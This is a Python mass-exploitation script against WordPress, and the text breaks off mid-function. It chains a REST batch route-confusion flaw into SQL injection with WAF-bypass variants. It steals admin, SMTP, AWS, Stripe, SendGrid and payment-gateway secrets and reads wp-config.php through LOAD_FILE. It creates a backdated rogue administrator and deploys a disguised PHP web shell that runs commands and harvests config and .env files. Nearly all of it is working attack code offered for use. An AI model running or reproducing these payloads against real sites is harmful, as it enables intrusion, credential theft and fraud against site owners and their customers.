#!/usr/bin/env python3
"""
v7-turbo: 3-Request WordPress Full Chain
Request 1: MEGA extraction (prefix, admin, IDs, creds, keys) - ALL IN ONE
Request 2: Batch poison + admin creation (7 patterns, 1 request)
Request 3: Deploy shell (XML-RPC → REST → Plugin ZIP → theme editor)

WAF bypass: multiple SQLi encoding variants, chunked queries, comment obfuscation.
Zero oEmbed seeding. Zero waiting. Pure SQLi-driven.
"""

import base64, hashlib, io, json, os, re, secrets, ssl, sys, time
import threading, urllib.parse, urllib.request, urllib.error, uuid, zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from http.cookiejar import CookieJar
import argparse
try:
    import readline
    readline.set_history_length(500)
except ImportError:
    readline = None  # Windows without pyreadline — history silently disabled

ssl._create_default_https_context = ssl._create_unverified_context

# ============================================================
# Config
# ============================================================
SHELL_NAME = "site-health"
MARKER_S = "AVRIL_START_JANCOK"
MARKER_E = "AVRIL_END_JANCOK"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

_lock = Lock()
_stats = {"total": 0, "done": 0, "rce": 0, "admin": 0, "fail": 0, "extract": 0, "smtp": 0, "aws": 0, "payment": 0, "creds": 0}
_start_time = 0
_seen_smtp = set()
_seen_payment = set()
_seen_aws = set()
_current_target = ""


# Output files (timestamped per run)
_base_dir = os.path.dirname(os.path.abspath(__file__))
_run_ts = time.strftime("%m%d_%H%M")
_results_file = os.path.join(_base_dir, f"run_{_run_ts}_results.txt")
_admin_file = os.path.join(_base_dir, f"run_{_run_ts}_admin.txt")
_stripe_file = os.path.join(_base_dir, f"run_{_run_ts}_stripe.txt")
_sendgrid_file = os.path.join(_base_dir, f"run_{_run_ts}_sendgrid.txt")
_brevo_file = os.path.join(_base_dir, f"run_{_run_ts}_brevo.txt")
_shells_file = os.path.join(_base_dir, f"run_{_run_ts}_shells.txt")
_creds_file = os.path.join(_base_dir, f"run_{_run_ts}_creds.txt")
_smtp_file = os.path.join(_base_dir, f"run_{_run_ts}_smtp.txt")
_aws_file = os.path.join(_base_dir, f"run_{_run_ts}_aws.txt")

# ============================================================
# Utilities
# ============================================================

def sql_hex(v):
    return f"0x{v.encode().hex()}" if v else "''"


def post_row(pid, content, title, status, name, parent, ptype):
    return ",".join((
        str(pid), "1", sql_hex("2020-01-01 00:00:00"), sql_hex("2020-01-01 00:00:00"),
        sql_hex(content), sql_hex(title), "''", sql_hex(status),
        sql_hex("closed"), sql_hex("closed"), "''", sql_hex(name),
        "''", "''", sql_hex("2020-01-01 00:00:00"), sql_hex("2020-01-01 00:00:00"),
        "''", str(parent), "''", "0", sql_hex(ptype), "''", "0",
    ))


def log_result(msg, filepath=None):
    with _lock:
        with open(filepath or _results_file, "a") as f:
            f.write(msg + "\n")
            f.flush()


def _http(req, timeout=10):
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        return e.read()
    except:
        return None


def decrypt_smtp_local(encrypted_b64, key_material):
    """Decrypt WP Mail SMTP password locally using extracted keys."""
    if not encrypted_b64 or not key_material or len(encrypted_b64) < 20:
        return None
    try:
        raw = base64.b64decode(encrypted_b64)
        if len(raw) < 20:
            return None
        iv = raw[:16]
        ct = raw[16:]
        key = key_material[:32].encode() if isinstance(key_material, str) else key_material[:32]
        if len(key) < 32:
            key = key.ljust(32, b'\x00')
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
            dec = cipher.decryptor()
            padded = dec.update(ct) + dec.finalize()
            pad_len = padded[-1]
            if pad_len <= 16:
                result = padded[:-pad_len].decode("utf-8", "replace")
            else:
                result = padded.decode("utf-8", "replace")
            if result and all(32 <= ord(c) < 127 for c in result):
                return result
        except ImportError:
            import subprocess
            key_hex = key.hex() if isinstance(key, bytes) else key.encode().hex()
            iv_hex = iv.hex()
            proc = subprocess.run(
                ["openssl", "enc", "-aes-256-cbc", "-d", "-K", key_hex[:64], "-iv", iv_hex, "-nosalt"],
                input=ct, capture_output=True, timeout=5)
            if proc.returncode == 0:
                result = proc.stdout.decode("utf-8", "replace").strip()
                if result and all(32 <= ord(c) < 127 for c in result):
                    return result
    except:
        pass
    return None


# ============================================================
# WAF Bypass SQLi Variants
# ============================================================

def _build_union_payload(query, variant=0):
    """Build UNION injection with WAF bypass variants."""
    date_hex = "0x323032302d30312d30312030303a30303a3030"
    status_hex = "0x7075626c697368"
    type_hex = "0x706f7374"
    title_expr = f"CONCAT(0x7c7c7c,HEX(CAST(COALESCE(({query}),'') AS CHAR)),0x7c7c7c)"

    cols = []
    for i in range(1, 24):
        if i == 1: cols.append("999999")
        elif i in (3, 4, 15, 16): cols.append(date_hex)
        elif i == 6: cols.append(title_expr)
        elif i == 8: cols.append(status_hex)
        elif i == 21: cols.append(type_hex)
        else: cols.append(str(i))

    select_part = ",".join(cols)

    # WAF bypass variants
    if variant == 0:
        return f"0) AND 3=4 UNION ALL SELECT {select_part} -- x"
    elif variant == 1:
        return f"0) /*!50000AND*/ 3=4 /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ {select_part} -- x"
    elif variant == 2:
        return f"0)AND(3=4)UNION%0aALL%0aSELECT%0a{select_part}-- x"
    elif variant == 3:
        return f"0) AND 3=4 UniOn AlL SeLeCt {select_part} -- x"
    elif variant == 4:
        return f"0)%09AND%093=4%09UNION%09ALL%09SELECT%09{select_part}-- x"
    return f"0) AND 3=4 UNION ALL SELECT {select_part} -- x"


# ============================================================
# Core: Batch Send
# ============================================================

def send_batch(batch_url, reqs, timeout=12):
    """Send nested batch with route-confusion desync."""
    payload = {
        "requests": [
            {"method": "POST", "path": "///"},
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": reqs}},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]
    }
    req = urllib.request.Request(
        batch_url, data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json", "User-Agent": UA}, method="POST")
    return _http(req, timeout)


def send_batch_exploit(batch_url, reqs, timeout=30):
    """Send nested batch for exploit (render/poison/user creation) - uses http://: primer."""
    payload = {
        "requests": [
            {"method": "POST", "path": "http://:"},
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": reqs}},
            {"method": "POST", "path": "/batch/v1"},
        ]
    }
    req = urllib.request.Request(
        batch_url, data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json", "User-Agent": UA}, method="POST")
    return _http(req, timeout)


def getval(batch_url, query, timeout=12, variant=0):
    """Extract single value via UNION SQLi using posts/999999 item-route desync."""
    union_payload = _build_union_payload(query, variant)
    params = urllib.parse.urlencode({
        "author_exclude": union_payload,
        "orderby": "none", "per_page": "500"
    })
    raw = send_batch(batch_url, [
        {"method": "POST", "path": "///"},
        {"method": "GET", "path": f"/wp/v2/posts/999999?{params}"},
        {"method": "GET", "path": "/wp/v2/posts"},
    ], timeout)
    if raw:
        m = re.search(rb'\|\|\|([0-9A-Fa-f]+)\|\|\|', raw)
        if m:
            hx = m.group(1).decode()
            if len(hx) % 2: hx = hx[:-1]
            return bytes.fromhex(hx).decode("utf-8", "replace") if hx else ""
    return None


# ============================================================
# REQUEST 1: MEGA Extraction (one-shot)
# ============================================================

def marker_probe(base_url, timeout=6):
    """Fast 1-request check: does target have route-confusion vulnerability?
    Returns batch_url if vuln, None if patched/dead."""
    for batch_url in [f"{base_url}/?rest_route=/batch/v1", f"{base_url}/wp-json/batch/v1", f"{base_url}/index.php?rest_route=/batch/v1"]:
        payload = json.dumps({"requests": [
            {"method": "POST", "path": "///"},
            {"method": "POST", "path": "/wp/v2/posts"},
            {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}).encode()
        try:
            req = urllib.request.Request(batch_url, data=payload, method="POST",
                headers={"Content-Type": "application/json", "User-Agent": UA})
            raw = _http(req, timeout)
            if raw and b"parse_path_failed" in raw and b"block_cannot_read" in raw and b"rest_batch_not_allowed" in raw:
                return batch_url
        except: pass
    return None


def mega_extract(base_url, timeout=12):
    """Single request extracts EVERYTHING needed for the chain."""
    # Normalize URL: strip trailing slash, ensure no double slash
    base_url = base_url.rstrip("/")

    # Fast marker probe: skip non-vulnerable targets immediately
    batch_url = marker_probe(base_url, min(timeout, 6))
    if not batch_url:
        return None

    # We already know which batch_url works from the probe
    batch_urls = [batch_url]

    prefix = None
    batch_url = None
    variant = 0

    for burl in batch_urls:
        # Try variant 0 first (fastest). Only try others if variant 0 gets response but no data
        prefix_q = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND RIGHT(TABLE_NAME,6)=0x5f706f737473 ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1"
        ptable = getval(burl, prefix_q, timeout, 0)
        if ptable and len(ptable) > 5:
            prefix = ptable[:-5]
            batch_url = burl
            variant = 0
            break
        # If we got a response (non-None from send_batch) but no data, try WAF bypasses
        test_resp = send_batch(burl, [{"method": "GET", "path": "http://:"}], min(timeout, 6))
        if test_resp and len(test_resp) > 50:
            # Server responded to batch - try WAF bypass variants
            for v in range(1, 5):
                ptable = getval(burl, prefix_q, timeout, v)
                if ptable and len(ptable) > 5:
                    prefix = ptable[:-5]
                    batch_url = burl
                    variant = v
                    break
            if prefix:
                break

    if not prefix or not batch_url:
        return None

    # MEGA QUERY: everything in 1 request
    mega_q = f"""SELECT CONCAT_WS(0x7c7c7c,
      COALESCE((SELECT CONCAT(u.ID,':',u.user_login) FROM `{prefix}users` u JOIN `{prefix}usermeta` m ON m.user_id=u.ID WHERE m.meta_key=0x{(prefix+'capabilities').encode().hex()} AND INSTR(m.meta_value,0x{b'administrator'.hex()})>0 ORDER BY u.ID LIMIT 1),''),
      COALESCE((SELECT GROUP_CONCAT(ID ORDER BY ID DESC SEPARATOR ',') FROM (SELECT ID FROM `{prefix}posts` WHERE post_type=0x6f656d6265645f6361636865 ORDER BY ID DESC LIMIT 10) t),''),
      COALESCE((SELECT GROUP_CONCAT(ID ORDER BY ID SEPARATOR ',') FROM (SELECT ID FROM `{prefix}posts` WHERE post_status='publish' ORDER BY ID LIMIT 7) t2),''),
      COALESCE((SELECT option_value FROM `{prefix}options` WHERE option_name='active_plugins'),''),
      COALESCE((SELECT SUBSTRING(option_value,1,900) FROM `{prefix}options` WHERE (option_name IN ('wp_mail_smtp','postman_options','swpsmtp_options','easy_wp_smtp','fluentmail-settings','post_smtp_options') OR option_name LIKE '%smtp%settings%') AND (option_value LIKE '%password%' OR option_value LIKE '%pass%' OR option_value LIKE '%smtp_host%') LIMIT 1),''),
      COALESCE((SELECT GROUP_CONCAT(SUBSTRING(option_value,1,500) SEPARATOR ';;') FROM `{prefix}options` WHERE option_value REGEXP 'AKIA[A-Z0-9]{{16}}' AND option_name NOT LIKE '_transient%' LIMIT 5),''),
      COALESCE((SELECT GROUP_CONCAT(CONCAT(option_name,'=',SUBSTRING(option_value,1,200)) SEPARATOR ';;') FROM `{prefix}options` WHERE (option_name LIKE '%aws%' OR option_name LIKE '%s3%' OR option_name LIKE '%amazon%' OR option_name LIKE '%access_key%' OR option_name LIKE '%secret_access%') AND option_name NOT LIKE '_transient%' LIMIT 20),''),
      COALESCE((SELECT GROUP_CONCAT(SUBSTRING(option_value,1,200) SEPARATOR ';;') FROM `{prefix}options` WHERE (option_value LIKE '%sk\\_live\\_%' OR option_value LIKE '%xkeysib-%' OR option_value LIKE 'SG.%' OR option_value LIKE '%rk\\_live\\_%') AND option_name NOT LIKE '_transient%' LIMIT 5),''),
      COALESCE((SELECT GROUP_CONCAT(CONCAT(option_name,'=',SUBSTRING(option_value,1,400)) SEPARATOR ';;') FROM `{prefix}options` WHERE option_name IN ('woocommerce_stripe_settings','woocommerce_paypal_settings','woocommerce_ppcp-gateway_settings','woocommerce_xendit_settings','woocommerce_midtrans_settings','woocommerce_razorpay_settings','woocommerce_doku_settings','woocommerce_ipaymu_settings') LIMIT 5),''),
      COALESCE((SELECT option_value FROM `{prefix}options` WHERE option_name='siteurl'),''),
      COALESCE((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() AND (table_name LIKE '%snippets%' OR table_name LIKE '%wpcode%')),'')
    )"""

    mega_result = getval(batch_url, mega_q, timeout, variant)
    if not mega_result:
        return None

    parts = mega_result.split("|||")
    if len(parts) < 8:
        return None

    admin_data = parts[0]
    oembed_ids = parts[1]
    post_ids = parts[2]
    plugins_raw = parts[3]
    smtp_raw = parts[4]
    aws_raw = parts[5]
    aws_secret_raw = parts[6] if len(parts) > 6 else ""
    payment_raw = parts[7] if len(parts) > 7 else ""
    siteurl = parts[8] if len(parts) > 8 else ""
    wc_raw = parts[9] if len(parts) > 9 else ""
    snippet_tables = parts[10] if len(parts) > 10 else ""

    # Parse admin
    aid, admin_login = 0, ""
    if ":" in admin_data:
        aid = int(admin_data.split(":")[0])
        admin_login = admin_data.split(":")[1]

    # Parse IDs
    cache_ids = [int(x) for x in oembed_ids.split(",") if x.strip().isdigit()]
    pub_ids = [int(x) for x in post_ids.split(",") if x.strip().isdigit()]

    # Use cache IDs if available, else published posts
    usable_ids = cache_ids[:7] if len(cache_ids) >= 3 else pub_ids[:7]

    # Try LOAD_FILE for wp-config keys (SMTP decrypt) - only if SMTP found
    wp_keys = None
    if smtp_raw and len(smtp_raw) > 10:
        # Quick FILE privilege check (1 request)
        file_test = getval(batch_url, "SELECT LOAD_FILE('/etc/passwd')", min(timeout, 6), variant)
        if file_test and "root:" in file_test:
            # Guess wp-config path from siteurl
            common_paths = ["/var/www/html/wp-config.php", "/var/www/wp-config.php"]
            if siteurl:
                from urllib.parse import urlparse
                host = urlparse(siteurl).hostname or ""
                if host:
                    common_paths = [
                        f"/home/{host.split('.')[0]}/public_html/wp-config.php",
                        f"/var/www/{host}/wp-config.php",
                        f"/var/www/html/{host}/wp-config.php",
                    ] + common_paths
            common_paths += [
                "/opt/bitnami/wordpress/wp-config.php",
                "/srv/www/wp-config.php",
                "/usr/share/nginx/html/wp-config.php",
            ]
            for cpath in common_paths[:6]:
                config = getval(batch_url, f"SELECT LOAD_FILE('{cpath}')", min(timeout, 8), variant)
                if config and "DB_NAME" in config:
                    # WP Mail SMTP uses SECURE_AUTH_KEY+SECURE_AUTH_SALT or AUTH_KEY+AUTH_SALT
                    for kn in ['SECURE_AUTH_KEY', 'AUTH_KEY', 'LOGGED_IN_KEY']:
                        key_m = re.search(kn + r"['\"],\s*['\"]([^'\"]+)", config)
                        if key_m:
                            salt_n = kn.replace('_KEY', '_SALT')
                            salt_m = re.search(salt_n + r"['\"],\s*['\"]([^'\"]+)", config)
                            wp_keys = (key_m.group(1) + (salt_m.group(1) if salt_m else ""))[:32]
                            break
                    break

    return {
        "batch_url": batch_url,
        "prefix": prefix,
        "variant": variant,
        "aid": aid,
        "admin_login": admin_login,
        "cache_ids": cache_ids,
        "post_ids": pub_ids,
        "usable_ids": usable_ids,
        "plugins": plugins_raw,
        "smtp_raw": smtp_raw,
        "aws_raw": aws_raw,
        "aws_secret_raw": aws_secret_raw,
        "payment_raw": payment_raw,
        "wc_raw": wc_raw,
        "siteurl": siteurl,
        "wp_keys": wp_keys,
        "snippet_tables": snippet_tables,
    }


# ============================================================
# REQUEST 2: Seed oEmbed + Extract cache IDs (minimal, 3-4 requests)
# ============================================================

def seed_oembed(base_url, data, timeout=15):
    """Seed oEmbed cache entries via UNION render and extract their IDs.
    Uses the official wp2shell technique: render fake post with [embed] shortcodes
    through the posts collection response - WordPress creates cache entries internally."""
    batch_url = data["batch_url"]
    prefix = data["prefix"]
    variant = data["variant"]

    # Get a published post/page link for oEmbed loopback
    post_link = None
    for route in ("/wp/v2/posts", "/wp/v2/pages"):
        try:
            rest_url = f"{base_url}/?rest_route={route}&per_page=1&_fields=link"
            req = urllib.request.Request(rest_url, headers={"User-Agent": UA})
            resp = urllib.request.urlopen(req, timeout=8)
            items = json.loads(resp.read())
            if items and items[0].get("link"):
                post_link = items[0]["link"]
                break
        except: pass
    if not post_link:
        post_link = f"{base_url}/?p=1"

    # Generate 3 unique embed URLs (using fragment to differentiate)
    pp = urllib.parse.urlsplit(post_link)
    etoken = secrets.token_hex(6)
    eurls = [urllib.parse.urlunsplit((pp.scheme, pp.netloc, pp.path, pp.query, f"{etoken}{i}")) for i in range(3)]

    # Seed: render a fake post with [embed] shortcodes via UNION
    # WordPress processes [embed] during rendering and creates oembed_cache posts internally
    seed_content = "".join(f'[embed width="500" height="750"]{u}[/embed]' for u in eurls)
    seed_row = post_row(0, seed_content, "seed", "publish", "seed", 0, "post")
    union_payload = "1) AND 1=0 UNION ALL SELECT " + seed_row + " -- -"
    pparams = urllib.parse.urlencode({"author_exclude": union_payload, "per_page": "500", "orderby": "none"})
    # Use exploit batch (http://: primer) for render operations
    send_batch_exploit(batch_url, [
        {"method": "GET", "path": "http://:"},
        {"method": "GET", "path": f"/wp/v2/posts/999999?{pparams}"},
        {"method": "GET", "path": "/wp/v2/posts"},
    ], timeout + 45)

    # Extract cache IDs (no external trigger needed - render creates them)
    esize = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
    cids = []
    for eu in eurls:
        ck = hashlib.md5((eu + esize).encode()).hexdigest()
        cid = getval(batch_url, f"SELECT ID FROM `{prefix}posts` WHERE post_type=0x6f656d6265645f6361636865 AND post_name=0x{ck.encode().hex()} ORDER BY ID DESC LIMIT 1", timeout, variant)
        if cid and cid.strip().isdigit():
            cids.append(int(cid))

    if len(cids) < 3:
        # Retry: render again with longer timeout
        send_batch_exploit(batch_url, [
            {"method": "GET", "path": "http://:"},
            {"method": "GET", "path": f"/wp/v2/posts/999999?{pparams}"},
            {"method": "GET", "path": "/wp/v2/posts"},
        ], timeout + 60)
        time.sleep(2)
        cids = []
        for eu in eurls:
            ck = hashlib.md5((eu + esize).encode()).hexdigest()
            cid = getval(batch_url, f"SELECT ID FROM `{prefix}posts` WHERE post_type=0x6f656d6265645f6361636865 AND post_name=0x{ck.encode().hex()} ORDER BY ID DESC LIMIT 1", timeout, variant)
            if cid and cid.strip().isdigit():
                cids.append(int(cid))

    return eurls, cids


# ============================================================
# REQUEST 3: Poison + Create Admin (sequential per-pattern, matches v6)
# ============================================================

def poison_and_create(base_url, data, eurls, cids, timeout=15):
    """Fire poison patterns SEQUENTIALLY (each in own batch) + create admin.
    Requires seeded oEmbed cache (eurls + cids from seed_oembed)."""
    batch_url = data["batch_url"]
    aid = data["aid"]
    admin_login = data["admin_login"]

    if not cids or len(cids) < 3 or not aid:
        return None

    oid = 1800000000 + secrets.randbelow(100000000)

    # Build changeset JSON (nav_menu_item pointing to admin user)
    cs = json.dumps({f"nav_menu_item[{oid+1}]": {"type": "nav_menu_item", "user_id": aid, "value": {"object_id": 0, "object": "", "menu_item_parent": 0, "position": 0, "type": "custom", "title": "generated", "url": "https://example.invalid/", "target": "", "attr_title": "", "description": "", "classes": "", "xfn": "", "status": "publish", "nav_menu_term_id": 0, "_invalid": False}}}, separators=(",", ":"))

    # Build poison patterns (matches v6 exactly)
    poison_patterns = []

    # Pattern 1: future status changeset + embed row
    p1 = [
        post_row(0, f'[embed width="500" height="750"]{eurls[1]}[/embed]', "t", "publish", "t", 0, "post"),
        post_row(cids[0], cs, "c", "future", str(uuid.uuid4()), oid, "customize_changeset"),
        post_row(oid, "o", "o", "draft", "o", cids[0], "post"),
        post_row(cids[1], "", "x", "publish", "x", cids[0], "post"),
        post_row(oid+1, "n", "n", "publish", "n", cids[2], "nav_menu_item"),
        post_row(cids[2], "p", "p", "parse", "p", oid+2, "request"),
        post_row(oid+2, "i", "i", "draft", "i", cids[2], "post"),
    ]
    poison_patterns.append("1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(p1) + " -- -")

    # Pattern 2: publish status changeset + embed row
    p2 = [
        post_row(0, f'[embed width="500" height="750"]{eurls[1]}[/embed]', "t", "publish", "t", 0, "post"),
        post_row(cids[0], cs, "c", "publish", str(uuid.uuid4()), oid, "customize_changeset"),
        post_row(oid, "o", "o", "draft", "o", cids[0], "post"),
        post_row(cids[1], "", "x", "publish", "x", cids[0], "post"),
        post_row(oid+1, "n", "n", "publish", "n", cids[2], "nav_menu_item"),
        post_row(cids[2], "p", "p", "publish", "p", oid+2, "request"),
        post_row(oid+2, "i", "i", "draft", "i", cids[2], "post"),
    ]
    poison_patterns.append("1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(p2) + " -- -")

    # Pattern 3: changeset first, embed last (different order)
    p3 = [
        post_row(cids[0], cs, "c", "future", str(uuid.uuid4()), oid, "customize_changeset"),
        post_row(oid, "o", "o", "draft", "o", cids[0], "post"),
        post_row(cids[1], "", "x", "publish", "x", cids[0], "post"),
        post_row(oid+1, "n", "n", "publish", "n", cids[2], "nav_menu_item"),
        post_row(cids[2], "p", "p", "parse", "p", oid+2, "request"),
        post_row(oid+2, "i", "i", "draft", "i", cids[2], "post"),
        post_row(0, f'[embed width="500" height="750"]{eurls[0]}[/embed]', "t", "publish", "t", 0, "post"),
    ]
    poison_patterns.append("1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(p3) + " -- -")

    # Try 2 attempts with different usernames
    for attempt in range(2):
        user = f"{admin_login}s{secrets.token_hex(3)}"
        pwd = f"W2s!{secrets.token_urlsafe(15)}"
        email = f"{user}@{urllib.parse.urlsplit(base_url).hostname}"
        backdate = f"2020-{secrets.randbelow(12)+1:02d}-{secrets.randbelow(28)+1:02d} {secrets.randbelow(23):02d}:{secrets.randbelow(59):02d}:{secrets.randbelow(59):02d}"
        user_body = {"username": user, "email": email, "password": pwd, "roles": ["administrator"], "user_registered": backdate}

        # FIRE PHASE: each pattern in its OWN batch (matches official wp2shell flow)
        for psql in poison_patterns[:3]:
            pparams = urllib.parse.urlencode({
                "author_exclude": f"1) AND {psql}",
                "per_page": "500", "orderby": "none"
            })
            # Inner batch: primer + poison via posts/999999 + posts + user creation (x2)
            inner_reqs = [
                {"method": "GET", "path": "http://:"},
                {"method": "GET", "path": f"/wp/v2/posts/999999?{pparams}"},
                {"method": "GET", "path": "/wp/v2/posts"},
                {"method": "POST", "path": "/wp/v2/users", "body": user_body},
                {"method": "POST", "path": "/wp/v2/users", "body": user_body},
            ]
            send_batch_exploit(batch_url, inner_reqs, timeout)

        # SETTLE: let DB commit propagate
        time.sleep(0.5)

        # VERIFY: Basic Auth first (fastest, no cookies)
        cred = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        try:
            r = urllib.request.urlopen(urllib.request.Request(
                f"{base_url}/wp-json/wp/v2/users/me",
                headers={"User-Agent": UA, "Authorization": f"Basic {cred}"}
            ), timeout=8)
            resp_data = json.loads(r.read())
            if resp_data.get("id"):
                return {"user": user, "pwd": pwd, "uid": resp_data["id"]}
        except: pass

        # VERIFY: XML-RPC
        try:
            xmlv = f"""<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params>
<param><value><string>{user}</string></value></param>
<param><value><string>{pwd}</string></value></param></params></methodCall>"""
            vreq = urllib.request.Request(f"{base_url}/xmlrpc.php", data=xmlv.encode(), method="POST",
                                          headers={"Content-Type": "text/xml", "User-Agent": UA})
            vresp = urllib.request.urlopen(vreq, timeout=8).read().decode(errors="replace")
            if "<name>isAdmin</name>" in vresp or "<name>blogid</name>" in vresp:
                return {"user": user, "pwd": pwd}
        except: pass

        # VERIFY: Cookie login
        cj = CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        login_data = urllib.parse.urlencode({"log": user, "pwd": pwd, "wp-submit": "Log In", "redirect_to": f"{base_url}/wp-admin/", "testcookie": "1"}).encode()
        try: opener.open(urllib.request.Request(f"{base_url}/wp-login.php", data=login_data, headers={"User-Agent": UA}), timeout=10)
        except: pass
        if any("wordpress_logged_in" in c.name for c in cj):
            return {"user": user, "pwd": pwd, "opener": opener}

    return None


# ============================================================
# REQUEST 3: Deploy Shell
# ============================================================

def deploy_shell(base_url, creds, command="id", timeout=15, data=None):
    """Deploy shell using multiple methods. Returns (shell_url, output, method) or None."""
    user = creds["user"]
    pwd = creds["pwd"]
    token = secrets.token_hex(6)
    shell_name = f"{SHELL_NAME}-{token}.php"

    # Global deploy timeout — kalau semua method kena block, max 90 detik lalu bail
    _deploy_start = time.time()
    _deploy_max = min(timeout * 5, 90)

    def _timed_out():
        return (time.time() - _deploy_start) > _deploy_max

    # Always create cookie session first (most reliable auth method)
    cj = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    opener.addheaders = [("User-Agent", UA)]
    login_data = urllib.parse.urlencode({"log": user, "pwd": pwd, "wp-submit": "Log In", "redirect_to": f"{base_url}/wp-admin/", "testcookie": "1"}).encode()
    try:
        opener.open(urllib.request.Request(f"{base_url}/wp-login.php", data=login_data, headers={"User-Agent": UA}), timeout=10)
    except: pass
    logged_in = any("wordpress_logged_in" in c.name for c in cj)
    if not logged_in:
        return None

    # Early detection: cek DISALLOW_FILE_MODS dan xmlrpc status (1 request, hemat waktu)
    _disallow_file_mods = False
    _xmlrpc_ok = False
    try:
        pi_resp = opener.open(urllib.request.Request(
            f"{base_url}/wp-admin/plugin-install.php?tab=upload",
            headers={"User-Agent": UA}), timeout=6)
        pi_html = pi_resp.read().decode(errors='replace')
        if "disallowed" in pi_html.lower() or "file modification" in pi_html.lower() or \
           "DISALLOW_FILE_MODS" in pi_html or "not permitted" in pi_html.lower():
            _disallow_file_mods = True
        # Kalau nonce ada, plugin install masih bisa
        if re.search(r'name="_wpnonce"\s+value="([^"]+)"', pi_html):
            _disallow_file_mods = False  # override — upload still possible
    except: pass
    try:
        xr = urllib.request.urlopen(urllib.request.Request(
            f"{base_url}/xmlrpc.php", headers={"User-Agent": UA}), timeout=5)
        if b"XML-RPC" in xr.read(200):
            _xmlrpc_ok = True
    except urllib.error.HTTPError as e:
        if e.code in (200, 405):
            _xmlrpc_ok = True
    except: pass

    shell_code = f"""<?php
if(isset($_REQUEST['c'])){{$c=base64_decode($_REQUEST['c']).' 2>&1';$o='';
$f=['system','passthru','shell_exec','exec','popen','proc_open'];
$d=@ini_get('disable_functions');$d=$d?array_map('trim',explode(',',$d)):[];
foreach($f as $fn){{if(!in_array($fn,$d)&&function_exists($fn)){{
if($fn==='exec'){{@exec($c,$a);$o=implode("\\n",$a);break;}}
elseif($fn==='popen'){{$h=@popen($c,'r');$o='';while(!feof($h))$o.=fread($h,4096);pclose($h);break;}}
elseif($fn==='proc_open'){{$p=@proc_open($c,[1=>['pipe','w'],2=>['pipe','w']],$pp);$o=stream_get_contents($pp[1]);fclose($pp[1]);fclose($pp[2]);proc_close($p);break;}}
elseif($fn==='shell_exec'){{$o=@shell_exec($c);break;}}
else{{ob_start();@$fn($c);$o=ob_get_clean();break;}}}}}}
if(!$o&&isset($_REQUEST['r'])){{$o=@file_get_contents(base64_decode($_REQUEST['r']));}}
echo '{MARKER_S}'.$o.'{MARKER_E}';exit;}}
if(isset($_REQUEST['harvest'])){{$j=[];
$ps=['../wp-config.php','wp-config.php','../../wp-config.php','../../../wp-config.php'];
foreach($ps as $p){{if(@file_exists($p)){{$j['wpconfig']=@file_get_contents($p);break;}}}}
$es=['../.env','.env','../../.env','../../../.env'];
foreach($es as $e){{if(@file_exists($e)){{$j['env']=@file_get_contents($e);break;}}}}
$j['cwd']=getcwd();$j['df']=@ini_get('disable_functions');
$j['uname']=php_uname();$j['uid']=getmyuid().'('.get_current_user().')';
echo '{MARKER_S}'.json_encode($j).'{MARKER_E}';exit;}}
echo '{MARKER_S}ALIVE{MARKER_E}';
?>
<!DOCTYPE html>
<html>
<head>
<title>Interactive Terminal</title>
<style>
body {{ background: #0f0f0f; color: #00ff00; font-family: monospace; padding: 20px; }}
input[type="text"] {{ background: #000; color: #00ff00; border: 1px solid #00ff00; width: 80%; padding: 5px; font-family: monospace; }}
input[type="submit"] {{ background: #00ff00; color: #000; border: none; padding: 5px 15px; font-family: monospace; cursor: pointer; font-weight: bold; }}
pre {{ background: #1a1a1a; padding: 15px; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; }}
</style>
</head>
<body>
<h3>Command Executor</h3>
<form method="POST">
<input type="text" name="cmd" autofocus placeholder="Enter command (e.g. id, ls -la)">
<input type="submit" value="Run">
</form>
<?php
if(isset($_POST['cmd'])){{
    $c=$_POST['cmd'].' 2>&1';
    $o='';
    $f=['system','passthru','shell_exec','exec','popen','proc_open'];
    $d=@ini_get('disable_functions');$d=$d?array_map('trim',explode(',',$d)):[];
    foreach($f as $fn){{
        if(!in_array($fn,$d)&&function_exists($fn)){{
            if($fn==='exec'){{@exec($c,$a);$o=implode("\\n",$a);break;}}
            elseif($fn==='popen'){{$h=@popen($c,'r');$o='';while(!feof($h))$o.=fread($h,4096);pclose($h);break;}}
            elseif($fn==='proc_open'){{$p=@proc_open($c,[1=>['pipe','w'],2=>['pipe','w']],$pp);$o=stream_get_contents($pp[1]);fclose($pp[1]);fclose($pp[2]);proc_close($p);break;}}
            elseif($fn==='shell_exec'){{$o=@shell_exec($c);break;}}
            else{{ob_start();@$fn($c);$o=ob_get_clean();break;}}
        }}
    }}
    echo "<h4>Output:</h4><pre>".htmlspecialchars($o)."</pre>";
}}
?>
</body>
</html>
"""

    shell_b64 = base64.b64encode(shell_code.encode()).decode()

    def verify(url):
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": UA}), timeout=8)
            return MARKER_S.encode() in r.read()
        except:
            return False

    def execute(url, cmd):
